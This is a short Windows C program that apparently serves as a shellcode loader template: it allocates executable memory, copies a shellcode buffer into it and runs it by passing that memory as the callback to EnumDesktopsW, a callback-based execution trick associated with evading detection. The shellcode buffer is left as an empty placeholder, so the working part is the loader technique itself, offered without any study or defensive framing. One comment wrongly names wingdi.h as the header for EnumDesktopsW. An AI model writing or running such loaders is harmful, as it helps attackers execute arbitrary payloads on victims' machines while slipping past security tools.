#include<windows.h>
#include<stdio.h>
#include<wingdi.h>  // Include necessary header for EnumDesktopsW

int main(){
    char shellcode [] = " ";

    // Calculate the length of the shellcode array
    int payloadLen = sizeof(shellcode);
    
    // Allocate memory for the shellcode
    HANDLE hAlloc = VirtualAlloc(0,payloadLen,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    
    // Copy the shellcode to the allocated memory
    memcpy(hAlloc,shellcode,payloadLen);
    
    // Enumerate desktops, passing the address of the shellcode as the callback function
    EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW)hAlloc,0);

    return 0;
}